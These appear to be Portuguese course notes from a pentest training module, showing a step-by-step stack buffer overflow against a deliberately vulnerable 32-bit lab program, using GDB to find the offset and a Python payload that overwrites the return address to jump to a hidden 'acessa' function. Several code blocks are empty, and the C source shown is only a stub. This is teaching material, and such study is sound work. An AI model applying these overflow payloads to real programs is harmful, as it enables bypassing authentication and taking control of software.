# 12 - Trabalhando com Exploits

##### kali 32-bits

## 01 - Buffer overflow no Linux

##### protegido.c

```c
printf("");
```
### GDB

```
root@kali:~# gdb ./protegido
GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git Copyright (C) 2016 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type "show copying" and "show warranty" for details. This GDB was configured as "i686-linux-gnu". Type "show configuration" for configuration details. For bug reporting instructions, please see: . Find the GDB manual and other documentation resources online at: . For help, type "help". Type "apropos word" to search for commands related to "word"... Reading symbols from ./protegido...(no debugging symbols found)...done. (gdb) 
```

```
(gdb) info functions
```

![info-functions](https://preview.ibb.co/eq3QSH/image.png)

```
(gdb) disas main
```

![disas-main](https://preview.ibb.co/m3ZbZx/image.png)

```
(gdb) disas verifica
Dump of assembler code for function verifica:
   0x00000608 <+0>:	push   %ebp
   0x00000609 <+1>:	mov    %esp,%ebp
   0x0000060b <+3>:	push   %ebx
   0x0000060c <+4>:	sub    $0x194,%esp
   0x00000612 <+10>:	call   0x4e0 <__x86.get_pc_thunk.bx>
   0x00000617 <+15>:	add    $0x19e9,%ebx
   0x0000061d <+21>:	sub    $0xc,%esp
   0x00000620 <+24>:	lea    -0x184d(%ebx),%eax
   0x00000626 <+30>:	push   %eax
   0x00000627 <+31>:	call   0x440 <printf@plt>
   0x0000062c <+36>:	add    $0x10,%esp
   0x0000062f <+39>:	sub    $0xc,%esp
   0x00000632 <+42>:	lea    -0x198(%ebp),%eax
   0x00000638 <+48>:	push   %eax
   0x00000639 <+49>:	call   0x450 <gets@plt>
   0x0000063e <+54>:	add    $0x10,%esp
   0x00000641 <+57>:	sub    $0x8,%esp
   0x00000644 <+60>:	lea    -0x1839(%ebx),%eax
   0x0000064a <+66>:	push   %eax
   0x0000064b <+67>:	lea    -0x198(%ebp),%eax
   0x00000651 <+73>:	push   %eax
   0x00000652 <+74>:	call   0x430 <strcmp@plt>
   0x00000657 <+79>:	add    $0x10,%esp
   0x0000065a <+82>:	test   %eax,%eax
   0x0000065c <+84>:	jne    0x672 <verifica+106>
   0x0000065e <+86>:	sub    $0xc,%esp
   0x00000661 <+89>:	lea    -0x1833(%ebx),%eax
   0x00000667 <+95>:	push   %eax
   0x00000668 <+96>:	call   0x460 <puts@plt>
   0x0000066d <+101>:	add    $0x10,%esp
   0x00000670 <+104>:	jmp    0x6a8 <verifica+160>
   0x00000672 <+106>:	sub    $0x8,%esp
   0x00000675 <+109>:	lea    -0x181c(%ebx),%eax
   0x0000067b <+115>:	push   %eax
   0x0000067c <+116>:	lea    -0x198(%ebp),%eax
---Type <return> to continue, or q <return> to quit---
   0x00000682 <+122>:	push   %eax
   0x00000683 <+123>:	call   0x430 <strcmp@plt>
   0x00000688 <+128>:	add    $0x10,%esp
   0x0000068b <+131>:	test   %eax,%eax
   0x0000068d <+133>:	jne    0x696 <verifica+142>
   0x0000068f <+135>:	call   0x5dd <acessa>
   0x00000694 <+140>:	jmp    0x6a8 <verifica+160>
   0x00000696 <+142>:	sub    $0xc,%esp
   0x00000699 <+145>:	lea    -0x1810(%ebx),%eax
   0x0000069f <+151>:	push   %eax
   0x000006a0 <+152>:	call   0x460 <puts@plt>
   0x000006a5 <+157>:	add    $0x10,%esp
   0x000006a8 <+160>:	mov    $0x0,%eax
   0x000006ad <+165>:	mov    -0x4(%ebp),%ebx
   0x000006b0 <+168>:	leave  
   0x000006b1 <+169>:	ret    
End of assembler dump.
```

```
(gdb) disas acessa
Dump of assembler code for function acessa:
   0x000005dd <+0>:	push   %ebp
   0x000005de <+1>:	mov    %esp,%ebp
   0x000005e0 <+3>:	push   %ebx
   0x000005e1 <+4>:	sub    $0x4,%esp
   0x000005e4 <+7>:	call   0x703 <__x86.get_pc_thunk.ax>
   0x000005e9 <+12>:	add    $0x1a17,%eax
   0x000005ee <+17>:	sub    $0xc,%esp
   0x000005f1 <+20>:	lea    -0x1870(%eax),%edx
   0x000005f7 <+26>:	push   %edx
   0x000005f8 <+27>:	mov    %eax,%ebx
   0x000005fa <+29>:	call   0x460 <puts@plt>
   0x000005ff <+34>:	add    $0x10,%esp
   0x00000602 <+37>:	nop
   0x00000603 <+38>:	mov    -0x4(%ebp),%ebx
   0x00000606 <+41>:	leave  
   0x00000607 <+42>:	ret    
End of assembler dump.
(gdb) 
```

* lea 0x198

```
root@kali-32:~# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02) 
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "198"
>>> int(a, 16)
408
>>> 
```

## 0x02 - Buffer Overflow no Linux (pt. 02)

```
(gdb) run
Entre com a senha: 123
Acesso negado
[Inferior 1 (process 2259) exited normally]
(gdb) 
```

```
(gdb) run < comand.txt
(gdb) run < <(python -c 'print "A" * 408')
```

```
(gdb) help x
Examine memory: x/FMT ADDRESS.
ADDRESS is an expression for the memory address to examine.
FMT is a repeat count followed by a format letter and a size letter.
Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
  t(binary), f(float), a(address), i(instruction), c(char), s(string)
  and z(hex, zero padded on the left).
Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
The specified number of objects of the specified size are printed
according to the format.  If a negative number is specified, memory is
examined backward from the address.

Defaults for format and size letters are those previously used.
Default count is 1.  Default address is following last thing printed
with this command or "print".
```

```
(gdb) info registers
eax            0x0	0
ecx            0x41414141	1094795585
edx            0xb7fa1890	-1208346480
ebx            0x41414141	1094795585
esp            0x4141413d	0x4141413d
ebp            0x41414141	0x41414141
esi            0xb7fa0000	-1208352768
edi            0x0	0
eip            0x400702	0x400702 <main+80>
eflags         0x10282	[ SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

```
(gdb) b* 0x0040063e
Breakpoint 1 at 0x40063e
```

```
(gdb) run < <(python -c 'print "A" * 408')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Documents/projects/study/information-security/pentest-profissional-desec/12-trabalhando-com-exploits/scripts/protegido < <(python -c 'print "A" * 408')

Breakpoint 1, 0x0040063e in verifica ()
```

```
(gdb) x/20xw $esp
0xbffff070:	0xbffff080	0x00000000	0xb7fe1279	0x00400617
0xbffff080:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff090:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0b0:	0x41414141	0x41414141	0x41414141	0x41414141
```

* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
	...

```
(gdb) 
0xbffff200:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff210:	0x41414141	0x41414141	0xbffff200	0x004006f4
0xbffff220:	0xbffff240	0x00000000	0x00000000	0xb7de3e81
0xbffff230:	0xb7fa0000	0xb7fa0000	0x00000000	0xb7de3e81
0xbffff240:	0x00000001	0xbffff2d4	0xbffff2dc	0xbffff264
```

```
(gdb) x/1xw $ebp
0xbffff218:	0xbffff200
```

```
(gdb) run < <(python -c 'print "A" * 408 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Documents/projects/study/information-security/pentest-profissional-desec/12-trabalhando-com-exploits/scripts/protegido < <(python -c 'print "A" * 408 + "BBBB"')

Breakpoint 1, 0x0040063e in verifica ()
```

```
(gdb) i r
eax            0xbffff080	-1073745792
ecx            0xb7fa05c0	-1208351296
edx            0xb7fa189c	-1208346468
ebx            0x402000	4202496
esp            0xbffff070	0xbffff070
ebp            0xbffff218	0xbffff218
esi            0xb7fa0000	-1208352768
edi            0x0	0
eip            0x40063e	0x40063e <verifica+54>
eflags         0x246	[ PF ZF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

```
(gdb) x/20xw $esp
0xbffff070:	0xbffff080	0x00000000	0xb7fe1279	0x00400617
0xbffff080:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff090:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0b0:	0x41414141	0x41414141	0x41414141	0x41414141
```

* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
	...

```
(gdb) 
0xbffff200:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff210:	0x41414141	0x41414141	0x42424242	0x00400600
0xbffff220:	0xbffff240	0x00000000	0x00000000	0xb7de3e81
0xbffff230:	0xb7fa0000	0xb7fa0000	0x00000000	0xb7de3e81
0xbffff240:	0x00000001	0xbffff2d4	0xbffff2dc	0xbffff264
```

```
(gdb) x/1xw $ebp
0xbffff218:	0x42424242
```

```
(gdb) c
Continuing.
Entre com a senha: Acesso negado

Program received signal SIGSEGV, Segmentation fault.
0x00400600 in acessa ()
```

```
(gdb) i r
eax            0x0	0
ecx            0x403160	4206944
edx            0xb7fa1890	-1208346480
ebx            0x41414141	1094795585
esp            0xbffff220	0xbffff220
ebp            0x42424242	0x42424242
esi            0xb7fa0000	-1208352768
edi            0x0	0
eip            0x400600	0x400600 <acessa+35>
eflags         0x10282	[ SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

```
(gdb) run < <(python -c 'print "A" * 412 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Documents/projects/study/information-security/pentest-profissional-desec/12-trabalhando-com-exploits/scripts/protegido < <(python -c 'print "A" * 412 + "BBBB"')

Breakpoint 1, 0x0040063e in verifica ()
(gdb) 
```

```
(gdb) x/20xw $esp
0xbffff070:	0xbffff080	0x00000000	0xb7fe1279	0x00400617
0xbffff080:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff090:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0b0:	0x41414141	0x41414141	0x41414141	0x41414141
```

* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
* PRESS ENTER
	...


```
(gdb) 
0xbffff200:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff210:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffff220:	0xbffff200	0x00000000	0x00000000	0xb7de3e81
0xbffff230:	0xb7fa0000	0xb7fa0000	0x00000000	0xb7de3e81
0xbffff240:	0x00000001	0xbffff2d4	0xbffff2dc	0xbffff264
(gdb) 
```

```
(gdb) c
Continuing.
Entre com a senha: Acesso negado

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
```

```
(gdb) i r
eax            0x0	0
ecx            0x403160	4206944
edx            0xb7fa1890	-1208346480
ebx            0x41414141	1094795585
esp            0xbffff220	0xbffff220
ebp            0x41414141	0x41414141
esi            0xb7fa0000	-1208352768
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x10282	[ SF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

* Função acessa() addres: 0x4005dd

```
(gdb) run < <(python -c 'print "A" * 412 + "\xdd\x05\x40"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Documents/projects/study/information-security/pentest-profissional-desec/12-trabalhando-com-exploits/scripts/protegido < <(python -c 'print "A" * 412 + "\xdd\x05\x40"')

Breakpoint 1, 0x0040063e in verifica ()
(gdb) i r
eax            0xbffff080	-1073745792
ecx            0xb7fa05c0	-1208351296
edx            0xb7fa189c	-1208346468
ebx            0x402000	4202496
esp            0xbffff070	0xbffff070
ebp            0xbffff218	0xbffff218
esi            0xb7fa0000	-1208352768
edi            0x0	0
eip            0x40063e	0x40063e <verifica+54>
eflags         0x246	[ PF ZF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/20xw $esp
0xbffff070:	0xbffff080	0x00000000	0xb7fe1279	0x00400617
0xbffff080:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff090:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0b0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff0c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff0f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff100:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff110:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff120:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff130:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff140:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff150:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff160:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff170:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff180:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff190:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff1a0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff1b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff1c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff1d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff1e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff1f0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff200:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff210:	0x41414141	0x41414141	0x41414141	0x004005dd
0xbffff220:	0xbffff240	0x00000000	0x00000000	0xb7de3e81
0xbffff230:	0xb7fa0000	0xb7fa0000	0x00000000	0xb7de3e81
0xbffff240:	0x00000001	0xbffff2d4	0xbffff2dc	0xbffff264
(gdb) c
Continuing.
Entre com a senha: Acesso negado
Voce conseguiu acessar.. muito bom

Program received signal SIGSEGV, Segmentation fault.
0xbffff240 in ?? ()
```

```
```

```
```

```
```

```
```

```
```

```
```
